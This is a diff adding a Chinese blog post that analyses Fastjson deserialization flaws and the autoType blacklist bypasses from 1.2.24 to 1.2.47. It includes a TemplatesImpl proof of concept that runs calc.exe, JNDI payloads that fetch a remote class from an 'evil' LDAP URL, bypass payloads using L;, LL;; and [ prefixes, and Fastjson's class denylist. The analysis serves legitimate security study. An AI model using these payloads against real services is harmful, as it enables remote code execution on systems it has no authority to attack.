@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- 核心修复：添加 no-referrer 标签破解第三方图床防盗链 -->
+    <meta name="referrer" content="no-referrer">
+    
+    <title>Fastjson漏洞原理分析 | ZIMU BLOG</title>
+    <link rel="stylesheet" href="/css/style.css">
+<meta name="generator" content="Hexo 8.1.1"></head>
+<!-- 强制 body 层级左对齐 -->
+<body style="text-align: left; margin: 0; padding: 0;">
+    <!-- 像素光流背景系统 -->
+    <div class="pixel-light-container">
+        <div class="pixel-grid-mask"></div>
+        <div class="energy-wave wave-1"></div>
+        <div class="energy-wave wave-2"></div>
+        <div class="energy-wave wave-3"></div>
+    </div>
+
+    <!-- 极简导航 -->
+    <nav style="display: flex; justify-content: space-between; align-items: center; padding: 25px 5%; position: relative; z-index: 10;">
+        <div style="display: flex; gap: 30px; font-size: 0.75rem; color: rgba(255,255,255,0.6); text-transform: uppercase; letter-spacing: 1px; font-weight: 500;">
+            <a href="/" style="opacity: 0.8;">Home</a>
+            <a href="/archives/" style="opacity: 0.8;">Articles</a>
+            <a href="/categories/" style="opacity: 0.8;">Categories</a>
+            <a href="https://github.com/zimu61" target="_blank" style="opacity: 0.8;">Contact</a>
+        </div>
+    </nav>
+
+    <!-- Hero 区域 -->
+    <header style="padding: 120px 5% 60px; text-align: left; max-width: 1000px; position: relative;">
+        <!-- 右侧轨道装饰 -->
+        <div class="orbit-system">
+            <div class="orbit-ring"></div>
+            <div class="orbit-planet"></div>
+            <div class="orbit-label"></div>
+        </div>
+
+        <p style="font-size: 0.7rem; letter-spacing: 3px; color: #00f3ff; text-transform: uppercase; margin-bottom: 25px; display: flex; align-items: center; gap: 10px;">
+            <span style="width: 20px; height: 1px; background: #00f3ff;"></span>
+            System Online
+        </p>
+        
+        <h1 style="font-size: clamp(3.5rem, 9vw, 5.5rem); margin: 0; line-height: 1.05; letter-spacing: -2px;">
+            Architect your <br>
+            <span style="background: linear-gradient(90deg, #fff, rgba(255,255,255,0.4)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-style: italic; font-family: 'Playfair Display', serif;">
+                digital legacy.
+            </span>
+        </h1>
+        
+        <!-- 底部信息 -->
+        <div style="margin-top: 50px; display: flex; align-items: center; gap: 20px;">
+            <div style="display: flex; align-items: center; gap: 15px;">
+                <img src="/images/avatar.jpg" alt="Avatar"
+                     style="width: 44px; height: 44px; border-radius: 50%; border: 1px solid rgba(255,255,255,0.2); object-fit: cover; background-color: #1a1a24;">
+                <div>
+                    <div style="font-family: 'Inter', sans-serif; font-weight: 600; font-size: 0.9rem; color: #fff;">ZIMU</div>
+                    <div style="font-size: 0.65rem; color: #00f3ff; letter-spacing: 1px;">WEB SEC</div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- 强制 main 容器左对齐 -->
+    <main id="main" style="text-align: left;">
+        <article class="post-detail">
+    <!-- 文章头部信息 -->
+    <header style="margin-bottom: 40px; border-bottom: 1px dashed rgba(0, 243, 255, 0.2); padding-bottom: 20px;">
+        <h1 class="postTitle" style="margin-bottom: 10px; font-size: 2rem;">Fastjson漏洞原理分析</h1>
+        <div class="post-meta" style="color: var(--accent-cyan); font-size: 0.8rem; letter-spacing: 1.5px; opacity: 0.8;">
+            PUBLISHED: 2026-08-02 18:19
+        </div>
+    </header>
+
+    <!-- 文章正文区域，加上 id 供下方 JS 抓取生成目录 -->
+    <div id="post-body" class="postCon" style="color: #fff; line-height: 1.8;">
+        <h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>使用 <code>JSON.parse(jsonString)</code> 和 <code>JSON.parseObject(jsonString, Target.class)</code>，两者调用链一致，前者会在 jsonString 中解析字符串获取 <code>@type</code> 指定的类，后者则会直接使用参数中的class</p>
+<p>fastjson 在创建一个类实例时会通过反射调用类中符合条件的 getter&#x2F;setter 方法，其中 getter 方法需满足条件：方法名长于 4、不是静态方法、以 <code>get</code> 开头且第4位是大写字母、方法不能有参数传入、继承自 <code>Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong</code>、此属性没有 setter 方法；setter 方法需满足条件：方法名长于 4，以 <code>set</code> 开头且第4位是大写字母、非静态方法、返回类型为 void 或当前类、参数个数为 1 个。具体逻辑在 <code>com.alibaba.fastjson.util.JavaBeanInfo.build()</code> 中</p>
+<p>使用 <code>JSON.parseObject(jsonString)</code> 将会返回 JSONObject 对象，且类中的所有 getter 与setter 都被调用</p>
+<p>如果目标类中私有变量没有 setter 方法，但是在反序列化时仍想给这个变量赋值，则需要使用 <code>Feature.SupportNonPublicField</code> 参数</p>
+<p>fastjson 在为类属性寻找 get&#x2F;set 方法时，调用函数 <code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code> 方法，会忽略 <code>_|-</code> 字符串，也就是说哪怕你的字段名叫 <code>_a_g_e_</code>，getter 方法为 <code>getAge()</code>，fastjson 也可以找得到，在 1.2.36 版本及后续版本还可以支持同时使用 <code>_</code> 和 <code>-</code> 进行组合混淆</p>
+<p>fastjson 在反序列化时，如果 Field 类型为 <code>byte[]</code>，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code> 进行 base64 解码，对应的，在序列化时也会进行 base64 编码</p>
+<h2 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson &lt;&#x3D;1.2.24"></a>Fastjson &lt;&#x3D;1.2.24</h2><h3 id="TemplatesImpl利用链"><a href="#TemplatesImpl利用链" class="headerlink" title="TemplatesImpl利用链"></a>TemplatesImpl利用链</h3><p>条件：</p>
+<ol>
+<li>服务端使用parseObject()时，必须使用如下格式才能触发漏洞：<br>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);</li>
+<li>服务端使用parse()时，需要 JSON.parse(text1,Feature.SupportNonPublicField);</li>
+</ol>
+<p>这是因为com&#x2F;sun&#x2F;org&#x2F;apache&#x2F;xalan&#x2F;internal&#x2F;xsltc&#x2F;trax&#x2F;TemplatesImpl.java中，需要我们赋值的一些属性是</p>
+<p>私有的，我们需要设置一些配置，反序列化时才会从json中设置这些私有属性，所以这个链子的条件是比较严苛的，不常用</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785416768880-b8ca603f-26c9-40bb-bb31-7004ff88b0a2.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Base64Tool</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">FiletoBase64</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filename);</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">io</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">byte</span>[] buf = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">10240</span>];</span><br><span class="line">        <span class="type">int</span> len;</span><br><span class="line">        <span class="keyword">while</span> ((len = io.read(buf)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            os.write(buf, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">        io.close();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(os.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Shell</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span></span><br><span class="line">            TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator,</span></span><br><span class="line"><span class="params">                          SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Base64Tool</span> <span class="variable">ClassBase64Util</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Base64Tool</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">shell</span> <span class="operator">=</span>  ClassBase64Util.FiletoBase64(<span class="string">&quot;F:\\JavaProject\\Fastjson_research\\Fastjson_research\\src\\main\\java\\org\\example\\Shell.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+shell+<span class="string">&quot;\&quot;],\&quot;_name\&quot;:\&quot;a.b\&quot;,\&quot;_tfactory\&quot;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,\&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="comment">// System.out.println(payload1);</span></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(payload1, Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>利用链分析：</p>
+<p>这里我们就不跟fastjson内部的反序列化过程了，如果想要深入了解可以自行学习，然后去调试parse的过程，是有些复杂的，我们直接看看TemplatesImpl中的调用链</p>
+<p>我们的payload中设置了5个属性</p>
+<p><code>_bytecodes</code></p>
+<p><code>_name</code></p>
+<p><code>_tfactory</code></p>
+<p><code>_outputProperties</code></p>
+<p><code>_version</code></p>
+<p>查看<code>TemplatesImpl.java</code></p>
+<p>只有_outputProperties 有一个在反序列化初始化时可被调用的getter方法，具体原因可以回看前置知识</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785485468459-495410d6-d0f0-4470-b91f-93b8e75b261b.png"></p>
+<p>接着就会调用<code>newTransformer().getOutputProperties();</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785485522613-78e805e9-e5de-4e53-926c-a597567915c3.png"></p>
+<p>那么就会调用<code>getTransletInstance()</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785485587117-d4a5aa42-6e05-4eaa-aa91-5cd757f41285.png"></p>
+<p>看这条方法</p>
+<p><code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code></p>
+<p>他会实例化我们的恶意类并触发构造方法</p>
+<p>其实到这，你应该会想到在java安全CC链篇中（虽然还没更新完），CB链和动态加载字节码部分和这里是一样的，只不过触发<code>getOutputProperties()</code>的方法不一样</p>
+<h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>这条链子就稍微简单一些，我们直接看<code>com.sun.rowset.JdbcRowSetImpl</code></p>
+<p>看<code>setAutoCommit()</code>方法</p>
+<p>如果this.conn等于null 就执行<code>this.connect()</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785487404759-01b4ec02-95cf-4432-8256-c6ef4fe671f4.png"></p>
+<p>看一下这个<code>connect()</code> 调用了<code>javax.naming.InitialContext#lookup()</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785487562331-cb225c17-26de-4c07-ab38-4f8e91765d10.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785487613257-88408f1d-cbed-45ae-a771-10e947d82b0d.png"></p>
+<p>这里的参数从成员变量dataSource中获取，那么利用jndi注入，访问一个远程的恶意类</p>
+<p>那么payload如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1234/evil&quot;</span>,</span><br><span class="line">    <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="fastjson-1-2-25"><a href="#fastjson-1-2-25" class="headerlink" title="fastjson-1.2.25"></a>fastjson-1.2.25</h2><p>在版本 1.2.25 中，官方对之前的反序列化漏洞进行了修复，引入了 checkAutoType 安全机制，默认情况下 autoTypeSupport 关闭，不能直接反序列化任意类，而打开 AutoType 之后，是基于内置黑名单来实现安全的，fastjson 也提供了添加黑名单的接口</p>
+<p>TemplatesImpl 链在1.2.25执行报错如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> com.alibaba.fastjson.JSONException: autoType is not support. com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br><span class="line">	at com.alibaba.fastjson.parser.ParserConfig.checkAutoType(ParserConfig.java:<span class="number">844</span>)</span><br><span class="line">	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:<span class="number">322</span>)</span><br><span class="line">	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:<span class="number">1327</span>)</span><br><span class="line">	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:<span class="number">1293</span>)</span><br><span class="line">	at com.alibaba.fastjson.JSON.parse(JSON.java:<span class="number">137</span>)</span><br><span class="line">	at com.alibaba.fastjson.JSON.parse(JSON.java:<span class="number">193</span>)</span><br><span class="line">	at com.alibaba.fastjson.JSON.parseObject(JSON.java:<span class="number">197</span>)</span><br><span class="line">	at org.example.Main.main(Main.java:<span class="number">18</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们可以看一下<code>com.alibaba.fastjson.parser.ParserConfig</code></p>
+<p>布尔型的 autoTypeSupport，用来标识是否开启任意类型的反序列化，并且默认关闭；字符串数组 denyList ，是反序列化类的黑名单；acceptList 是反序列化白名单</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785488524535-4b0457b5-253e-4e7f-9e5c-31ba6a385f7a.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure>
+
+<p>反序列化白名单有3种方法添加：</p>
+<ol>
+<li>使用代码进行添加：<code>ParserConfig.getGlobalInstance().addAccept(“org.su18.fastjson.,org.javaweb.”)</code></li>
+<li>加上JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=org.su18.fastjson.</code></li>
+<li>在fastjson.properties中添加：<code>fastjson.parser.autoTypeAccept=org.su18.fastjson.</code></li>
+</ol>
+<p>我们的重点是看<code>checkAutoType()</code>的逻辑</p>
+<p>如果开启了 autoType，先判断类名是否在白名单中，如果在，就使用 <code>TypeUtils.loadClass</code> 加载</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785489079905-64dadac7-f3ba-4bb5-9bde-2b874ef6d171.png"></p>
+<p>然后使用黑名单判断类名的开头，如果匹配就抛出异常</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785489125198-54577604-883f-4ac1-be02-9068f8999272.png"></p>
+<p>如果没开启 autoType ，则是先使用黑名单匹配，再使用白名单匹配和加载</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785489330296-8bd23586-99d8-444d-af11-96aff363caec.png"></p>
+<p>如果要反序列化的类和黑白名单都未匹配时，只有开启了 autoType 或者 expectClass 不为空也就是指定了 Class 对象时才会调用 <code>TypeUtils.loadClass</code> 加载</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785489405758-a3e0ff40-836f-4ca0-940b-da66a22c8fa2.png"></p>
+<p>我们再看一下<code>loadClass</code>的逻辑</p>
+<p>有这么两段代码</p>
+<p>在加载目标类之前为了兼容带有描述符的类名，使用了递归调用来处理描述符中的 <code>[</code>、<code>L</code>、<code>;</code> 字符</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785489571863-2049f090-54cf-4f78-828b-957b609e5a56.png"></p>
+<p>那么这个位置就出现了逻辑问题，在开启autoType的情况下，如果我在类前后加上<code>L</code>和<code>;</code></p>
+<p>是不是绕过了黑名单？但正常情况下这个类没法用，可这里的<code>loadClass</code>正好帮我们处理掉了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,</span><br><span class="line">    &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1234/evil&quot;,</span><br><span class="line">    &quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="fastjson-1-2-42"><a href="#fastjson-1-2-42" class="headerlink" title="fastjson-1.2.42"></a>fastjson-1.2.42</h2><p>这个版本中大部分逻辑没有变，主要有如下变化：</p>
+<p>黑名单由原来的明文变成了使用HASH查询</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785490614418-b00acab9-f607-4bc8-b3f8-950d47808b29.png"></p>
+<p><code>checkAutoType</code> 前多加了一段代码，用来去除首尾的<code>L``;</code></p>
+<p>但这里的代码逻辑只会去除一次，双写就好了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785491012700-298874d1-3db9-4faf-bab2-1ae12d8cd554.png"></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,</span><br><span class="line">    &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1234/evil&quot;,</span><br><span class="line">    &quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="fastjson-1-2-43"><a href="#fastjson-1-2-43" class="headerlink" title="fastjson-1.2.43"></a>fastjson-1.2.43</h2><p>增加了一个判断，如果开头有连续两个LL直接抛出异常</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785491349062-4e1dcc3c-4ebb-4a0d-86c6-22fd0acb8207.png"></p>
+<p>那么<code>L</code> <code>;</code>就没法绕了，但是还记得我们在<code>loadClass</code>中的这段代码吗？</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785491746176-d1d984e4-a81e-4226-98b4-08242cff705c.png"></p>
+<p>对<code>[</code>也是有处理的，那能不能用来绕过？</p>
+<p>当然可以！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;dataSourceName&quot;: &quot;ldap://127.0.0.1:1389/Basic/Command/calc&quot;,</span><br><span class="line">    &quot;autoCommit&quot;: true</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="fastjson-1-2-44"><a href="#fastjson-1-2-44" class="headerlink" title="fastjson-1.2.44"></a>fastjson-1.2.44</h2><p>修复了<code>[</code>的绕过</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785492521950-9e9b39dc-6e3b-45b0-919f-a1342ed78b6d.png"></p>
+<h2 id="fastjson-1-2-47"><a href="#fastjson-1-2-47" class="headerlink" title="fastjson-1.2.47"></a>fastjson-1.2.47</h2><p>1.2.25 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.32 未开启autoTypeSupport,可成功利用</p>
+<p>1.2.33 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.47 autoTypeSupport开启与否均可成功利用</p>
+<p>到 1.2.47 时，爆出了最为严重的漏洞，可以在不开启 AutoTypeSupport 的情况下进行反序列化的利用</p>
+<p>问题还是在<code>checkAutoType()</code></p>
+<p>autoTypeSupport 为 true 时 </p>
+<p>当反序列化的类在黑名单中，且 TypeUtils.mappings 中没有该类的缓存时，才会抛出异常</p>
+<p>这段代码是从1.2.33才有的，所以1.2.33 &lt;&#x3D; Fastjson &lt;&#x3D; 1.2.47 autoTypeSupport开启与否均可成功利用</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785495563448-ad877934-cf01-4072-893a-e5bbe8ffef0c.png"></p>
+<p>autoTypeSupport 为默认的 false 时</p>
+<p>程序直接检查黑名单并抛出异常，在这部分我们无法绕过，所以我们的关注点就在判断之前，程序有在 TypeUtils.mappings 中和 deserializers 中尝试查找要反序列化的类，如果找到了，则就会 return，这就避开下面 autoTypeSupport 默认为 false 时的检查。如何才能在这两步中将我们的恶意类加载进去呢？</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785495967325-9b5d9dcb-6d72-4934-b0cc-124856b5caa5.png"></p>
+<p>跟一下<code>getClassFromMapping</code> </p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785497858552-145c3121-0b67-483b-a223-2eb8ea4d2b86.png"></p>
+<p>这个方法从 <code>TypeUtils.mappings</code> 中取值，这是一个 ConcurrentHashMap 对象，能向其中赋值的函数有：</p>
+<ul>
+<li><code>addBaseClassMappings()</code>：无入参，纯加载的函数</li>
+<li><code>loadClass()</code>：关键函数</li>
+</ul>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785497922065-528bc021-062e-4688-80dd-5aa42ead8203.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785497935019-b4c7f2a6-f7fc-4dc3-82a0-d2dabbb46877.png"></p>
